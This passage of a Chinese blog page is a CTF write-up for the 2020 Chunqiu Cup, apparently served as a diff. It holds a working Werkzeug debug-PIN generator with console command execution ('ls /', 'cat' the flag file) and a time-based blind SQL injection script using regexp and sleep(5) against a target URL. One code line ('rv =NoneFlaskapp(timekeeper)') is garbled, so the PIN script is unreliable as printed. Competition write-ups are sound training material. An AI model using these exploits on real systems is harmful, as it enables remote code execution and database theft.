class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;52242498922&#x27;</span>,<span class="comment">#当前网络的mac地址的十进制数,通过文件/sys/class/net/eth0/address,eth0为当前使用的网卡</span></span><br><span class="line">    <span class="string">&#x27;19949f18ce36422da1402b3e3fe53008&#x27;</span><span class="comment"># 机器的id,/proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =NoneFlaskapp(timekeeper)</span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
+<p>在解码处使flask报错，鼠标移动到报错上，右侧会出现控制台的符号，点控制台符号，输入pin值，进入python交互式命令行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;app\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nrequirements.txt\nroot\nrun\nsbin\nsrv\nsys\nthis_is_the_flag.txt\ntmp\nusr\nvar\n&#x27;</span>  </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&#x27;cat this_is_the_flag.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+<p>读取flag</p>
+<h4 id="盲注-timekeeper"><a href="#盲注-timekeeper" class="headerlink" title="盲注(timekeeper)"></a>盲注(timekeeper)</h4><p>知识点：mysql正则（regexp）</p>
+<ol>
+<li>根据代码猜测字段名（列名）为<code>flllllllag</code><br><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217003227.png" alt="flllllag"></li>
+<li>利用burp+fuzz测试出waf</li>
+<li>构建脚本注出flag<br>注意：脚本中有两个需要注意的地方，第一个是正则表达是中的<code>.</code>和<code>?</code>，第二个是<code>&#123;</code>需要加反斜杠转义</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: Forthrglory</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span>(<span class="params">url</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    r = requests.session()</span><br><span class="line"></span><br><span class="line">    x = [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;\\\\&#123;&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;\\\\&#125;&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">43</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> x:</span><br><span class="line">            t = s + j</span><br><span class="line"></span><br><span class="line">            data = url + <span class="string">&#x27;id=(if((fl4g regexp &quot;^%s&quot;),sleep(5),1));&#x27;</span> % t</span><br><span class="line"></span><br><span class="line">            result = r.get(data)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (result.elapsed.total_seconds() &gt; <span class="number">5</span>):</span><br><span class="line">                s = t</span><br><span class="line">                print(s)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&#x27;flag=&#x27;</span> + s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://192.168.113.171:8899/index.php?&#x27;</span></span><br><span class="line"></span><br><span class="line">    f = getFlag(url)</span><br></pre></td></tr></table></figure>
+
+
+<h6 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h6><p>2020年春秋杯新春战“疫”WriteUp<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42812036/article/details/104497835">https://blog.csdn.net/qq_42812036/article/details/104497835</a><br>等</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#code-in-morse"><span class="toc-number">1.0.1.</span> <span class="toc-text">code in morse</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A3%81%E7%9B%98%E5%A5%97%E5%A8%83-Adolph"><span class="toc-number">1.0.2.</span> <span class="toc-text">磁盘套娃 | Adolph</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Flaskapp-timekeeper"><span class="toc-number">2.0.1.</span> <span class="toc-text">Flaskapp(timekeeper)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8-timekeeper"><span class="toc-number">2.0.2.</span> <span class="toc-text">盲注(timekeeper)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">2.0.2.0.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&text=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&title=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&is_video=false&description=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2020年春秋杯新春战“疫”WriteUp&body=Check out this article: http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&title=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&title=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&title=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&title=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&name=2020年春秋杯新春战“疫”WriteUp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&t=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    Elli0t
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-49627206-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-49627206-1');
+    </script>
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?4cc1f2d8f3067386cc5cdb626a202900";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
